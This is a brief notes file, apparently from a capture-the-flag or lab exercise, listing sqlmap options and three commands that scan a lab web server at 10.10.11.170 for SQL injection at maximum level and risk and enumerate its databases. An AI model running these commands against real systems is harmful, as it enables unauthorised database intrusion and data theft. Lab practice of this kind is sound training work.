--level=5 highest level
--risk=3 highest level 
--batch - run without asking any questions

sqlmap -u http://10.10.11.170:8080/ --batch


sqlmap -u http://10.10.11.170:8080/stats?author=woodenk --level=5 --risk=3 --batch



Enumerate databases
> sqlmap -u http://10.10.11.170:8080 --level=5 --risk=3 --batch --dbs
